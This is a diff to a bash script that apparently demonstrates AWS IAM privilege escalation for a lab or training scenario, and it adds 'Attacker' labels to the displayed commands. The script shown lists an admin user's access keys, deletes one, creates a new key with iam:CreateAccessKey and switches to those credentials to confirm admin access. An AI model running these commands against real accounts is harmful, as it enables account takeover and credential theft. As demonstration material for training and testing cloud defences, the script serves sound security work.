@@ -24,12 +24,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -89,7 +91,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -101,7 +103,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -109,7 +111,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -122,7 +124,7 @@ echo -e "${YELLOW}Step 5: Listing existing access keys for admin user${NC}"
 echo "Target admin user: $ADMIN_USER"
 echo "Using iam:ListAccessKeys to enumerate existing credentials..."
 
-show_cmd "aws iam list-access-keys --user-name $ADMIN_USER --output json"
+show_cmd "Attacker" "aws iam list-access-keys --user-name $ADMIN_USER --output json"
 EXISTING_KEYS=$(aws iam list-access-keys --user-name $ADMIN_USER --output json)
 KEY_COUNT=$(echo "$EXISTING_KEYS" | jq '.AccessKeyMetadata | length')
 
@@ -151,7 +153,7 @@ fi
 echo "$KEY_TO_DELETE" > /tmp/deleted_key_info.txt
 
 echo "Deleting access key: $KEY_TO_DELETE"
-show_attack_cmd "aws iam delete-access-key --user-name $ADMIN_USER --access-key-id $KEY_TO_DELETE"
+show_attack_cmd "Attacker" "aws iam delete-access-key --user-name $ADMIN_USER --access-key-id $KEY_TO_DELETE"
 aws iam delete-access-key \
     --user-name $ADMIN_USER \
     --access-key-id $KEY_TO_DELETE
@@ -163,7 +165,7 @@ echo -e "${YELLOW}Note: Deleted key ID saved for cleanup restoration${NC}\n"
 echo -e "${YELLOW}Step 7: Creating new access key for admin user${NC}"
 echo "Using iam:CreateAccessKey permission to create new credentials..."
 
-show_attack_cmd "aws iam create-access-key --user-name $ADMIN_USER --output json"
+show_attack_cmd "Attacker" "aws iam create-access-key --user-name $ADMIN_USER --output json"
 KEY_OUTPUT=$(aws iam create-access-key --user-name $ADMIN_USER --output json)
 NEW_ACCESS_KEY=$(echo $KEY_OUTPUT | jq -r '.AccessKey.AccessKeyId')
 NEW_SECRET_KEY=$(echo $KEY_OUTPUT | jq -r '.AccessKey.SecretAccessKey')
@@ -185,7 +187,7 @@ export AWS_SECRET_ACCESS_KEY=$NEW_SECRET_KEY
 export AWS_REGION=$AWS_REGION
 
 # Verify new identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 ADMIN_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $ADMIN_IDENTITY"
 
@@ -199,7 +201,7 @@ echo -e "${GREEN}✓ Now using admin credentials${NC}\n"
 echo -e "${YELLOW}Step 9: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 
-show_cmd "aws iam list-users --max-items 3 --output table"
+show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
